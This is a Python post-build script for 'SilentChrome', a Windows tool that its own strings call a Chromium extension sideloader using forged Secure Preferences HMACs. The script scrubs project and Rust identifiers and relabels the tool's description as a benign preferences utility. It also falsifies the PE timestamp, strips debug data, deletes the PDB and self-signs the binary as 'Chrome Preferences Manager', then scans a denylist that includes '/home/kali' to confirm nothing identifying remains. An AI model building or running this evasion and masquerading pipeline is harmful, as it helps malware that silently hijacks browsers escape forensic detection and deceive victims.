#!/usr/bin/env python3
"""Post-build PE hardening for the SilentChrome binary.

Scrubs Rust-identifying strings, project-identifying strings, rewrites the PE
timestamp, removes debug sections, trims trailing overlay, and scans for
remaining forensic markers.

Usage:
    python3 scripts/harden_pe.py target/x86_64-pc-windows-msvc/release/silent-chrome.exe
    python3 scripts/harden_pe.py silent-chrome.exe --timestamp 1720000000 --sign
"""

from __future__ import annotations

import argparse
import json
import shutil
import struct
import subprocess
import time
from pathlib import Path


STRING_REPLACEMENTS = [
    # Rust runtime
    (b"RUST_BACKTRACE", "TRACE_DISABLED"),
    (b"RUST_MIN_STACK", "SYST_MIN_STACK"),
    (b"RustBacktrace", "SyncPrimitive"),
    (b"__rust_end_short_backtrace", "__svc_end_short_tracedump "),
    (b"__rust_begin_short_backtrace", "__svc_begin_short_tracedump"),
    (b"rust_panic", "svc_faults"),
    (b"/rustc/", "/build/"),
    (b"/rust/deps\\", "/lib/deps\\"),
    (b"rustc-demangle", "format-decode"),
    (b"rustlib/src/rust/", "stdlib/src/core/ "),
    (b".cargo/registry/", ".lib/components/"),
    (b".rustup/", ".tools/ "),
    (b"index.crates.io", "lib.modules.io "),
    (b"fatal runtime error: ", "fatal process error: "),
    (b"thread local panicked on drop", "thread local faulted on drop "),
    (b"skipping backtrace printing", "skipping tracedump printing"),
    (b"x86_64-unknown-linux-gnu", "x86_64-generic-build-sys"),
    (b"stack backtrace:", "stack tracedump:"),
    # Crate names
    (b"serde_json", "codec_data"),
    (b"clap_builder", "args_parser"),
    (b"clap_lex", "args_lex"),
    (b"clap-rs/clap", "util-rs/util"),
    (b"hashbrown", "hashtable"),
    (b"anstyle-wincon", "termstyle-con"),
    (b"anstyle-parse", "termstyle-lex"),
    (b"anstyle", "trmfmt "),
    (b"anstream", "termflt"),
    (b"indexmap", "ordrhsh"),
    (b"strsim", "txtcmp"),
    (b"block-buffer", "chunk-buffer"),
    # Project identity
    (b"Chromium extension sideloader via Secure Preferences HMAC forging",
     "Browser preferences management utility for extension configuratio"),
    (b"Install an unpacked extension silently",
     "Install an unpacked extension quietly"),
    (b"silent-chrome", "browser-utils"),
    (b"silent_chrome", "browser_utils"),
    (b"SilentChrome", "BrowserUtils"),
    (b"Silent_Chrome", "Browser_Utils"),
    (b"silent_chrome.pdb", "browser_utils.pdb"),
]

DENYLIST = [
    b"RUST_BACKTRACE",
    b"RustBacktrace",
    b"/rustc/",
    b"rustc-demangle",
    b".cargo/registry",
    b".rustup/",
    b"index.crates.io",
    b"silent-chrome",
    b"silent_chrome",
    b"SilentChrome",
    b"Silent_Chrome",
    b"/home/kali",
    b"clap-rs/clap",
]

DEBUG_SECTION_NAMES = {
    ".debug",
    ".debug_abbrev",
    ".debug_addr",
    ".debug_aranges",
    ".debug_info",
    ".debug_line",
    ".debug_line_str",
    ".debug_loc",
    ".debug_loclists",
    ".debug_pubnames",
    ".debug_pubtypes",
    ".debug_ranges",
    ".debug_rnglists",
    ".debug_str",
    ".debug_str_offsets",
    ".zdebug_info",
    ".zdebug_line",
    ".zdebug_str",
    ".comment",
}


def _same_length(old: bytes, replacement: str) -> bytes:
    new = replacement.encode("ascii")
    if len(new) > len(old):
        raise ValueError(f"replacement for {old!r} is too long ({len(new)} > {len(old)})")
    return new.ljust(len(old), b" ")


def _find_tool(candidates: list[str]) -> str:
    for candidate in candidates:
        found = shutil.which(candidate)
        if found:
            return found
        if Path(candidate).exists():
            return candidate
    return ""


def _pe_layout(data: bytes) -> dict:
    if len(data) < 0x40 or data[:2] != b"MZ":
        raise ValueError("not a PE file")
    pe_offset = struct.unpack_from("<I", data, 0x3C)[0]
    if pe_offset + 24 > len(data) or data[pe_offset : pe_offset + 4] != b"PE\0\0":
        raise ValueError("invalid PE signature")
    file_header = pe_offset + 4
    section_count = struct.unpack_from("<H", data, file_header + 2)[0]
    optional_header_size = struct.unpack_from("<H", data, file_header + 16)[0]
    section_table = file_header + 20 + optional_header_size
    if section_table + (section_count * 40) > len(data):
        raise ValueError("invalid PE section table")
    return {
        "pe_offset": pe_offset,
        "file_header": file_header,
        "section_count": section_count,
        "section_table": section_table,
    }


def _section_names(data: bytes) -> list[str]:
    layout = _pe_layout(data)
    names: list[str] = []
    for i in range(layout["section_count"]):
        offset = layout["section_table"] + (i * 40)
        raw = data[offset : offset + 8].split(b"\0", 1)[0]
        if raw:
            try:
                names.append(raw.decode("ascii"))
            except UnicodeDecodeError:
                continue
    return names


def scrub_strings(exe_path: Path) -> dict[str, int]:
    data = exe_path.read_bytes()
    patched = data
    hits: dict[str, int] = {}
    for old, replacement in STRING_REPLACEMENTS:
        count = patched.count(old)
        if not count:
            continue
        patched = patched.replace(old, _same_length(old, replacement))
        hits[old.decode("ascii", errors="replace")] = count
    if patched != data:
        exe_path.write_bytes(patched)
    return hits


def set_pe_timestamp(exe_path: Path, timestamp: int) -> int:
    data = bytearray(exe_path.read_bytes())
    layout = _pe_layout(data)
    timestamp = int(timestamp) & 0xFFFFFFFF
    struct.pack_into("<I", data, layout["file_header"] + 4, timestamp)
    exe_path.write_bytes(data)
    return timestamp


def trim_trailing_overlay(exe_path: Path) -> int:
    data = exe_path.read_bytes()
    layout = _pe_layout(data)
    raw_end = 0
    for i in range(layout["section_count"]):
        offset = layout["section_table"] + (i * 40)
        raw_size = struct.unpack_from("<I", data, offset + 16)[0]
        raw_ptr = struct.unpack_from("<I", data, offset + 20)[0]
        if raw_ptr and raw_size:
            raw_end = max(raw_end, raw_ptr + raw_size)
    if raw_end <= 0 or raw_end >= len(data):
        return 0
    trimmed = data.rstrip(b"\0")
    if len(trimmed) < raw_end:
        trimmed = data[:raw_end]
    removed = len(data) - len(trimmed)
    if removed:
        exe_path.write_bytes(trimmed)
    return removed


def remove_debug_sections(exe_path: Path, objcopy_tool: str = "") -> dict:
    if not objcopy_tool:
        return {"removed": [], "tool": "", "error": "objcopy not available"}

    data = exe_path.read_bytes()
    existing = set(_section_names(data))
    remove_names = sorted(
        section
        for section in existing
        if section.startswith(".debug")
        or section.startswith(".zdebug")
        or section == ".comment"
    )
    for name in DEBUG_SECTION_NAMES:
        if name in existing and name not in remove_names:
            remove_names.append(name)
    remove_names = sorted(set(remove_names))
    if not remove_names:
        return {"removed": [], "tool": objcopy_tool, "error": ""}

    tmp_path = exe_path.with_suffix(exe_path.suffix + ".objcopy")
    command = [objcopy_tool]
    for name in remove_names:
        command.extend(["--remove-section", name])
    command.extend([str(exe_path), str(tmp_path)])
    result = subprocess.run(command, capture_output=True, text=True)
    if result.returncode != 0:
        if tmp_path.exists():
            tmp_path.unlink()
        output = (result.stdout or "") + (result.stderr or "")
        return {"removed": [], "tool": objcopy_tool, "error": output.strip()}
    shutil.move(str(tmp_path), exe_path)
    return {"removed": remove_names, "tool": objcopy_tool, "error": ""}


def strip_debug_symbols(exe_path: Path, strip_tool: str = "") -> dict:
    if not strip_tool:
        return {"tool": "", "ok": False, "error": "strip not available"}
    result = subprocess.run(
        [strip_tool, "--strip-debug", str(exe_path)],
        capture_output=True,
        text=True,
    )
    ok = result.returncode == 0
    output = (result.stdout or "") + (result.stderr or "")
    return {"tool": strip_tool, "ok": ok, "error": "" if ok else output.strip()}


def scan_denylist(exe_path: Path) -> dict[str, int]:
    data = exe_path.read_bytes()
    hits: dict[str, int] = {}
    for needle in DENYLIST:
        count = data.count(needle)
        if count:
            hits[needle.decode("ascii", errors="replace")] = count
    return hits


def sign_pe(
    exe_path: Path,
    work_dir: Path,
    subject: str = "Chrome Preferences Manager",
    product: str = "Chrome Preferences Manager",
) -> dict:
    openssl = _find_tool(["openssl"])
    osslsigncode = _find_tool(["osslsigncode"])
    if not openssl or not osslsigncode:
        missing = []
        if not openssl:
            missing.append("openssl")
        if not osslsigncode:
            missing.append("osslsigncode")
        return {"signed": False, "error": f"missing: {', '.join(missing)}"}

    cert_path = work_dir / "sc.crt"
    key_path = work_dir / "sc.key"
    signed_path = work_dir / f"{exe_path.stem}.signed{exe_path.suffix}"

    result = subprocess.run(
        [
            openssl, "req", "-x509", "-newkey", "rsa:2048",
            "-keyout", str(key_path), "-out", str(cert_path),
            "-days", "1095", "-nodes", "-subj", f"/CN={subject}",
        ],
        cwd=str(work_dir),
        capture_output=True,
        text=True,
    )
    if result.returncode != 0:
        return {"signed": False, "error": f"openssl failed: {result.stderr.strip()}"}

    result = subprocess.run(
        [
            osslsigncode, "sign",
            "-certs", str(cert_path), "-key", str(key_path),
            "-n", product,
            "-in", str(exe_path), "-out", str(signed_path),
        ],
        cwd=str(work_dir),
        capture_output=True,
        text=True,
    )
    if result.returncode != 0:
        return {"signed": False, "error": f"osslsigncode failed: {result.stderr.strip()}"}

    shutil.move(str(signed_path), exe_path)
    for f in (cert_path, key_path):
        if f.exists():
            f.unlink()
    return {"signed": True, "error": ""}


def harden(
    exe_path: Path,
    *,
    strip_tool: str = "",
    objcopy_tool: str = "",
    timestamp: int | None = None,
    do_sign: bool = False,
    sign_subject: str = "Chrome Preferences Manager",
    sign_product: str = "Chrome Preferences Manager",
) -> dict:
    exe_path = Path(exe_path)
    if not exe_path.exists():
        raise FileNotFoundError(f"PE not found: {exe_path}")

    timestamp = int(time.time()) if timestamp is None else int(timestamp)
    before_size = exe_path.stat().st_size

    strip_report = strip_debug_symbols(exe_path, strip_tool)
    section_report = remove_debug_sections(exe_path, objcopy_tool)
    scrubbed = scrub_strings(exe_path)
    written_timestamp = set_pe_timestamp(exe_path, timestamp)
    trimmed = trim_trailing_overlay(exe_path)
    denylist_hits = scan_denylist(exe_path)

    sign_report = {}
    if do_sign:
        sign_report = sign_pe(
            exe_path,
            exe_path.parent,
            subject=sign_subject,
            product=sign_product,
        )

    pdb_path = exe_path.with_suffix(".pdb")
    pdb_deleted = False
    if pdb_path.exists():
        pdb_path.unlink()
        pdb_deleted = True

    after_size = exe_path.stat().st_size

    return {
        "before_size": before_size,
        "after_size": after_size,
        "delta": before_size - after_size,
        "strip": strip_report,
        "sections": section_report,
        "scrubbed_strings": scrubbed,
        "scrub_count": sum(scrubbed.values()),
        "timestamp": written_timestamp,
        "trimmed_overlay": trimmed,
        "denylist_hits": denylist_hits,
        "denylist_clean": len(denylist_hits) == 0,
        "sign": sign_report,
        "pdb_deleted": pdb_deleted,
    }


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Post-build PE hardening for SilentChrome.",
    )
    parser.add_argument("exe", type=Path, help="Path to the PE executable")
    parser.add_argument(
        "--strip-tool",
        default="",
        help="Path to strip binary (auto-detected if omitted)",
    )
    parser.add_argument(
        "--objcopy-tool",
        default="",
        help="Path to objcopy binary (auto-detected if omitted)",
    )
    parser.add_argument(
        "--timestamp",
        type=int,
        default=None,
        help="PE TimeDateStamp value (default: current time)",
    )
    parser.add_argument(
        "--sign",
        action="store_true",
        help="Self-sign with osslsigncode (requires openssl + osslsigncode)",
    )
    parser.add_argument(
        "--sign-subject",
        default="Chrome Preferences Manager",
        help="Certificate CN for signing",
    )
    parser.add_argument(
        "--sign-product",
        default="Chrome Preferences Manager",
        help="Product name for signing",
    )
    parser.add_argument(
        "--json",
        action="store_true",
        help="Output report as JSON",
    )
    args = parser.parse_args()

    strip_tool = args.strip_tool or _find_tool(
        ["llvm-strip", "x86_64-w64-mingw32-strip", "strip"]
    )
    objcopy_tool = args.objcopy_tool or _find_tool(
        ["llvm-objcopy", "x86_64-w64-mingw32-objcopy", "objcopy"]
    )

    report = harden(
        args.exe,
        strip_tool=strip_tool,
        objcopy_tool=objcopy_tool,
        timestamp=args.timestamp,
        do_sign=args.sign,
        sign_subject=args.sign_subject,
        sign_product=args.sign_product,
    )

    if args.json:
        print(json.dumps(report, indent=2, sort_keys=True))
    else:
        print(f"Size: {report['before_size']} -> {report['after_size']} ({report['delta']:+d})")
        print(f"Strings scrubbed: {report['scrub_count']} ({len(report['scrubbed_strings'])} patterns)")
        for pattern, count in report["scrubbed_strings"].items():
            print(f"  {pattern!r}: {count}")
        print(f"PE timestamp: {report['timestamp']}")
        print(f"Overlay trimmed: {report['trimmed_overlay']} bytes")
        if report["sections"]["removed"]:
            print(f"Sections removed: {', '.join(report['sections']['removed'])}")
        if report["pdb_deleted"]:
            print("PDB file deleted")
        if report["sign"]:
            if report["sign"].get("signed"):
                print("PE signed")
            elif report["sign"].get("error"):
                print(f"Signing skipped: {report['sign']['error']}")
        if report["denylist_hits"]:
            print(f"\nWARNING: {len(report['denylist_hits'])} denylist strings remain:")
            for needle, count in report["denylist_hits"].items():
                print(f"  {needle!r}: {count}")
        else:
            print("\nDenylist: CLEAN")

    return 0 if report["denylist_clean"] else 1


if __name__ == "__main__":
    raise SystemExit(main())
